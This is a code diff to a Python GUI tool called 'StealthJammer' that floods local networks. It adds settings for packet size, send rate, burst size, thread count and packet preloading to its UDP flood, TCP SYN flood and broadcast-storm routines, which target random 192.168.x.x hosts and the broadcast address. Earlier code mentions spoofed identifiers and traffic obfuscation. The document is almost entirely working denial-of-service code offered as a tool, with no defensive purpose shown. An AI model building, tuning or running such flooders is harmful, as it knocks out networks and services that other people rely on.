@@ -52,6 +52,18 @@ class StealthJammer(tk.Tk):
         self.start_time = None
         self.bytes_sent = 0
         
+        # Advanced customization settings
+        self.packet_size_min = 512
+        self.packet_size_max = 2048
+        self.send_rate = 1000  # packets per second per thread
+        self.burst_size = 10
+        self.thread_multiplier = 5
+        
+        # Packet preloading
+        self.preloaded_packets = []
+        self.preload_count = 1000  # Number of packets to preload
+        self.preload_enabled = True
+        
         # Performance monitoring
         self.last_packet_count = 0
         self.last_byte_count = 0
@@ -242,9 +254,163 @@ class StealthJammer(tk.Tk):
         self.vector_broadcast_var = tk.BooleanVar(value=True)
         ttk.Checkbutton(vectors_frame, text="Broadcast Storm", variable=self.vector_broadcast_var).pack(anchor='w', pady=3)
         
+        # Advanced Configuration
+        advanced_frame = ttk.LabelFrame(left_column, text="ADVANCED CONFIGURATION", padding=15)
+        advanced_frame.grid(row=2, column=0, sticky='ew', pady=(0, 10))
+        
+        # Packet Size Configuration
+        ttk.Label(advanced_frame, text="Packet Size Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
+        
+        size_container = ttk.Frame(advanced_frame)
+        size_container.pack(fill='x', pady=5)
+        
+        size_min_frame = ttk.Frame(size_container)
+        size_min_frame.pack(fill='x', pady=2)
+        ttk.Label(size_min_frame, text="Min Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
+        self.packet_size_min_var = tk.IntVar(value=512)
+        size_min_spin = tk.Spinbox(size_min_frame, from_=64, to=1048576, increment=64,
+                                   textvariable=self.packet_size_min_var, font=('Consolas', 9),
+                                   width=8, command=self.update_packet_size)
+        size_min_spin.pack(side='right')
+        
+        size_max_frame = ttk.Frame(size_container)
+        size_max_frame.pack(fill='x', pady=2)
+        ttk.Label(size_max_frame, text="Max Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
+        self.packet_size_max_var = tk.IntVar(value=2048)
+        size_max_spin = tk.Spinbox(size_max_frame, from_=64, to=1048576, increment=64,
+                                   textvariable=self.packet_size_max_var, font=('Consolas', 9),
+                                   width=8, command=self.update_packet_size)
+        size_max_spin.pack(side='right')
+        
+        # Packet size presets
+        size_preset_frame = ttk.Frame(advanced_frame)
+        size_preset_frame.pack(fill='x', pady=5)
+        ttk.Label(size_preset_frame, text="Size Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
+        
+        size_preset_row1 = ttk.Frame(size_preset_frame)
+        size_preset_row1.pack(fill='x', pady=2)
+        
+        for name, min_s, max_s in [("Tiny", 64, 256), ("Small", 256, 512), ("Medium", 512, 2048)]:
+            btn = tk.Button(size_preset_row1, text=name, 
+                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
+                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
+            btn.pack(side='left', padx=1, expand=True, fill='x')
+        
+        size_preset_row2 = ttk.Frame(size_preset_frame)
+        size_preset_row2.pack(fill='x', pady=2)
+        
+        for name, min_s, max_s in [("Large", 2048, 8192), ("Huge", 8192, 65536), ("1 MB", 1048576, 1048576)]:
+            btn = tk.Button(size_preset_row2, text=name, 
+                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
+                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
+            btn.pack(side='left', padx=1, expand=True, fill='x')
+
+        
+        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # Send Rate Configuration
+        ttk.Label(advanced_frame, text="Send Rate Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
+        
+        rate_frame = ttk.Frame(advanced_frame)
+        rate_frame.pack(fill='x', pady=5)
+        
+        rate_header = ttk.Frame(rate_frame)
+        rate_header.pack(fill='x')
+        ttk.Label(rate_header, text="Packets/sec per thread:", font=('Segoe UI', 9)).pack(side='left')
+        self.rate_value_label = ttk.Label(rate_header, text="1000", font=('Segoe UI', 9, 'bold'),
+                                         foreground=self.accent_color)
+        self.rate_value_label.pack(side='right')
+        
+        self.send_rate_var = tk.IntVar(value=1000)
+        rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
+                              orient='horizontal', command=self.update_send_rate)
+        rate_scale.pack(fill='x', pady=2)
+        
+        # Rate presets
+        rate_preset_frame = ttk.Frame(advanced_frame)
+        rate_preset_frame.pack(fill='x', pady=5)
+        ttk.Label(rate_preset_frame, text="Rate Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
+        
+        for name, rate in [("Slow", 100), ("Normal", 1000), ("Fast", 5000), ("MAX", 10000)]:
+            btn = tk.Button(rate_preset_frame, text=name,
+                          command=lambda r=rate: self.send_rate_var.set(r) or self.update_send_rate(r),
+                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
+            btn.pack(side='left', padx=1, expand=True, fill='x')
+        
+        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # Burst Size Configuration
+        ttk.Label(advanced_frame, text="Burst Size:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
+        
+        burst_frame = ttk.Frame(advanced_frame)
+        burst_frame.pack(fill='x', pady=5)
+        
+        burst_header = ttk.Frame(burst_frame)
+        burst_header.pack(fill='x')
+        ttk.Label(burst_header, text="Packets per burst:", font=('Segoe UI', 9)).pack(side='left')
+        self.burst_value_label = ttk.Label(burst_header, text="10", font=('Segoe UI', 9, 'bold'),
+                                          foreground=self.accent_color)
+        self.burst_value_label.pack(side='right')
+        
+        self.burst_size_var = tk.IntVar(value=10)
+        burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
+                               orient='horizontal', command=self.update_burst_size)
+        burst_scale.pack(fill='x', pady=2)
+        
+        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # Thread Multiplier
+        ttk.Label(advanced_frame, text="Thread Multiplier:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
+        
+        thread_frame = ttk.Frame(advanced_frame)
+        thread_frame.pack(fill='x', pady=5)
+        
+        thread_header = ttk.Frame(thread_frame)
+        thread_header.pack(fill='x')
+        ttk.Label(thread_header, text="Threads per intensity:", font=('Segoe UI', 9)).pack(side='left')
+        self.thread_value_label = ttk.Label(thread_header, text="5x", font=('Segoe UI', 9, 'bold'),
+                                           foreground=self.accent_color)
+        self.thread_value_label.pack(side='right')
+        
+        self.thread_multiplier_var = tk.IntVar(value=5)
+        thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
+                                orient='horizontal', command=self.update_thread_multiplier)
+        thread_scale.pack(fill='x', pady=2)
+        
+        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # Packet Preloading
+        ttk.Label(advanced_frame, text="Packet Preloading:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
+        
+        preload_enable_frame = ttk.Frame(advanced_frame)
+        preload_enable_frame.pack(fill='x', pady=5)
+        ttk.Label(preload_enable_frame, text="Enable Preloading", font=('Segoe UI', 9)).pack(side='left')
+        self.preload_var = tk.BooleanVar(value=True)
+        ttk.Checkbutton(preload_enable_frame, variable=self.preload_var,
+                       command=self.update_preload_setting).pack(side='right')
+        
+        preload_count_frame = ttk.Frame(advanced_frame)
+        preload_count_frame.pack(fill='x', pady=2)
+        ttk.Label(preload_count_frame, text="Preload Count:", font=('Segoe UI', 9)).pack(side='left')
+        self.preload_count_var = tk.IntVar(value=1000)
+        preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=10000, increment=100,
+                                 textvariable=self.preload_count_var, font=('Consolas', 9),
+                                 width=8, command=self.update_preload_count)
+        preload_spin.pack(side='right')
+        
+        preload_btn = tk.Button(advanced_frame, text="Preload Packets Now",
+                               command=self.preload_packets_now,
+                               bg=self.accent_color, fg='white', font=('Segoe UI', 9),
+                               relief='flat', cursor='hand2')
+        preload_btn.pack(fill='x', pady=5)
+        
+        self.preload_status = ttk.Label(advanced_frame, text="Packets ready: 0",
+                                       font=('Consolas', 9), foreground=self.warning_color)
+        self.preload_status.pack(anchor='w', pady=2)
+        
         # Network Info
         network_frame = ttk.LabelFrame(left_column, text="NETWORK INFORMATION", padding=15)
-        network_frame.grid(row=2, column=0, sticky='ew')
+        network_frame.grid(row=3, column=0, sticky='ew')
         
         self.network_label = ttk.Label(network_frame, text="Interface: Detecting...", font=('Consolas', 9))
         self.network_label.pack(anchor='w', pady=2)
@@ -424,6 +590,87 @@ class StealthJammer(tk.Tk):
             bytes_val /= 1024.0
         return f"{bytes_val:.2f} TB"
     
+    def update_packet_size(self):
+        """Update packet size settings"""
+        self.packet_size_min = self.packet_size_min_var.get()
+        self.packet_size_max = self.packet_size_max_var.get()
+        
+        # Ensure min <= max
+        if self.packet_size_min > self.packet_size_max:
+            self.packet_size_min_var.set(self.packet_size_max)
+            self.packet_size_min = self.packet_size_max
+        
+        self.log_message(f"Packet size range: {self.packet_size_min}-{self.packet_size_max} bytes", "INFO")
+    
+    def set_packet_size_preset(self, min_size, max_size):
+        """Set packet size preset"""
+        self.packet_size_min_var.set(min_size)
+        self.packet_size_max_var.set(max_size)
+        self.update_packet_size()
+    
+    def update_send_rate(self, value):
+        """Update send rate setting"""
+        self.send_rate = int(float(value))
+        self.rate_value_label.config(text=f"{self.send_rate}")
+        self.log_message(f"Send rate: {self.send_rate} pps/thread", "INFO")
+    
+    def update_burst_size(self, value):
+        """Update burst size setting"""
+        self.burst_size = int(float(value))
+        self.burst_value_label.config(text=f"{self.burst_size}")
+        self.log_message(f"Burst size: {self.burst_size} packets", "INFO")
+    
+    def update_thread_multiplier(self, value):
+        """Update thread multiplier setting"""
+        self.thread_multiplier = int(float(value))
+        self.thread_value_label.config(text=f"{self.thread_multiplier}x")
+        self.log_message(f"Thread multiplier: {self.thread_multiplier}x", "INFO")
+    
+    def update_preload_setting(self):
+        """Update preload enable/disable"""
+        self.preload_enabled = self.preload_var.get()
+        status = "enabled" if self.preload_enabled else "disabled"
+        self.log_message(f"Packet preloading {status}", "INFO")
+    
+    def update_preload_count(self):
+        """Update preload count"""
+        self.preload_count = self.preload_count_var.get()
+        self.log_message(f"Preload count: {self.preload_count} packets", "INFO")
+    
+    def preload_packets_now(self):
+        """Preload packets into memory"""
+        self.log_message("Preloading packets into memory...", "INFO")
+        threading.Thread(target=self._preload_packets_thread, daemon=True).start()
+    
+    def _preload_packets_thread(self):
+        """Thread to preload packets"""
+        self.preloaded_packets = []
+        
+        for i in range(self.preload_count):
+            # Generate random packet data
+            size = random.randint(self.packet_size_min, self.packet_size_max)
+            packet_data = bytes(random.getrandbits(8) for _ in range(size))
+            
+            # Store packet with metadata
+            self.preloaded_packets.append({
+                'data': packet_data,
+                'size': size,
+                'target': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
+                'port': random.randint(1, 65535)
+            })
+            
+            # Update status every 100 packets
+            if (i + 1) % 100 == 0:
+                self.after(0, lambda count=i+1: self.preload_status.config(
+                    text=f"Packets ready: {count}/{self.preload_count}"))
+        
+        total_bytes = sum(p['size'] for p in self.preloaded_packets)
+        self.after(0, lambda: self.preload_status.config(
+            text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
+            foreground=self.success_color))
+        self.after(0, lambda: self.log_message(
+            f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
+    
     def detect_network_interface(self):
         """Detect active network interface on Windows"""
         try:
@@ -573,11 +820,19 @@ class StealthJammer(tk.Tk):
         
         self.log_message("Attack initiated", "ATTACK")
         self.log_message(f"Intensity level: {self.intensity}/10", "ATTACK")
+        self.log_message(f"Packet size: {self.packet_size_min}-{self.packet_size_max} bytes", "ATTACK")
+        self.log_message(f"Send rate: {self.send_rate} pps/thread", "ATTACK")
+        self.log_message(f"Burst size: {self.burst_size} packets", "ATTACK")
         
         self.generate_spoofed_identifiers()
         
-        # Significantly increase thread count for higher packet throughput
-        num_threads = self.intensity * 5  # Increased from 2 to 5
+        # Preload packets if enabled and not already loaded
+        if self.preload_enabled and len(self.preloaded_packets) == 0:
+            self.log_message("Auto-preloading packets for attack...", "INFO")
+            self._preload_packets_thread()
+        
+        # Use customizable thread multiplier
+        num_threads = self.intensity * self.thread_multiplier
         
         active_vectors = []
         if self.vector_udp_var.get():
@@ -603,6 +858,7 @@ class StealthJammer(tk.Tk):
         
         self.log_message(f"Vectors: {', '.join(active_vectors)}", "ATTACK")
         self.log_message(f"Spawned {len(self.attack_threads)} attack threads", "ATTACK")
+        self.log_message(f"Target throughput: {num_threads * self.send_rate:,} pps", "ATTACK")
         
         if self.vector_tcp_var.get():
             for _ in range(num_threads):
@@ -630,32 +886,41 @@ class StealthJammer(tk.Tk):
         self.attack_threads = []
     
     def udp_flood_attack(self):
-        """UDP flood with spoofing and obfuscation - optimized for high throughput"""
+        """UDP flood with preloaded packets and customizable settings"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Increase send buffer
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
+            
+            # Calculate delay based on send rate
+            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
+            
+            preload_index = 0
             
             while self.attack_active:
                 try:
-                    # Send bursts of packets
-                    burst_size = 10 if self.intensity >= 7 else 5
-                    
-                    for _ in range(burst_size):
-                        port = random.randint(1, 65535)
-                        size = random.randint(512, 2048) if self.traffic_obfuscation else 1024
-                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
-                        
-                        payload = bytes(random.getrandbits(8) for _ in range(size))
-                        sock.sendto(payload, (target, port))
+                    # Send burst of packets
+                    for _ in range(self.burst_size):
+                        if self.preload_enabled and len(self.preloaded_packets) > 0:
+                            # Use preloaded packet
+                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
+                            sock.sendto(packet['data'], (packet['target'], packet['port']))
+                            size = packet['size']
+                            preload_index += 1
+                        else:
+                            # Generate packet on the fly
+                            port = random.randint(1, 65535)
+                            size = random.randint(self.packet_size_min, self.packet_size_max)
+                            target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                            
+                            payload = bytes(random.getrandbits(8) for _ in range(size))
+                            sock.sendto(payload, (target, port))
                         
                         self.packets_sent += 1
                         self.bytes_sent += size
                     
-                    # Reduced delay for higher throughput
-                    if self.traffic_obfuscation:
-                        time.sleep(random.uniform(0.0001, 0.001))
-                    else:
-                        time.sleep(0.0001)
+                    # Adaptive delay based on send rate
+                    if delay_per_burst > 0:
+                        time.sleep(delay_per_burst)
                 except:
                     pass
             
@@ -664,16 +929,17 @@ class StealthJammer(tk.Tk):
             pass
     
     def tcp_syn_attack(self):
-        """TCP SYN flood with spoofing - optimized for high throughput"""
+        """TCP SYN flood with customizable send rate"""
         try:
+            # Calculate delay based on send rate
+            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
+            
             while self.attack_active:
                 try:
                     # Create bursts of connections
-                    burst_size = 5 if self.intensity >= 7 else 3
-                    
-                    for _ in range(burst_size):
+                    for _ in range(self.burst_size):
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.05)  # Very short timeout
+                        sock.settimeout(0.01)  # Very short timeout
                         
                         port = random.randint(1, 65535)
                         target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -687,44 +953,49 @@ class StealthJammer(tk.Tk):
                         self.packets_sent += 1
                         self.bytes_sent += 60  # Approximate TCP SYN packet size
                     
-                    # Minimal delay
-                    if self.traffic_obfuscation:
-                        time.sleep(random.uniform(0.0001, 0.0005))
-                    else:
-                        time.sleep(0.0001)
+                    # Adaptive delay
+                    if delay_per_burst > 0:
+                        time.sleep(delay_per_burst)
                 except:
                     pass
         except:
             pass
     
     def broadcast_storm_attack(self):
-        """Broadcast storm with spoofing - optimized for high throughput"""
+        """Broadcast storm with preloaded packets and customizable settings"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
+            
+            # Calculate delay based on send rate
+            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
+            
+            preload_index = 0
             
             while self.attack_active:
                 try:
-                    # Send bursts of broadcast packets
-                    burst_size = 8 if self.intensity >= 7 else 4
-                    
-                    for _ in range(burst_size):
-                        size = random.randint(512, 2048) if self.traffic_obfuscation else 1024
-                        payload = bytes(random.getrandbits(8) for _ in range(size))
+                    # Send burst of broadcast packets
+                    for _ in range(self.burst_size):
+                        if self.preload_enabled and len(self.preloaded_packets) > 0:
+                            # Use preloaded packet
+                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
+                            sock.sendto(packet['data'], ("255.255.255.255", packet['port']))
+                            size = packet['size']
+                            preload_index += 1
+                        else:
+                            # Generate packet on the fly
+                            size = random.randint(self.packet_size_min, self.packet_size_max)
+                            payload = bytes(random.getrandbits(8) for _ in range(size))
+                            port = random.randint(1, 65535)
+                            sock.sendto(payload, ("255.255.255.255", port))
                         
-                        broadcast = "255.255.255.255"
-                        port = random.randint(1, 65535)
-                        
-                        sock.sendto(payload, (broadcast, port))
                         self.packets_sent += 1
                         self.bytes_sent += size
                     
-                    # Minimal delay
-                    if self.traffic_obfuscation:
-                        time.sleep(random.uniform(0.0001, 0.001))
-                    else:
-                        time.sleep(0.0001)
+                    # Adaptive delay
+                    if delay_per_burst > 0:
+                        time.sleep(delay_per_burst)
                 except:
                     pass
             
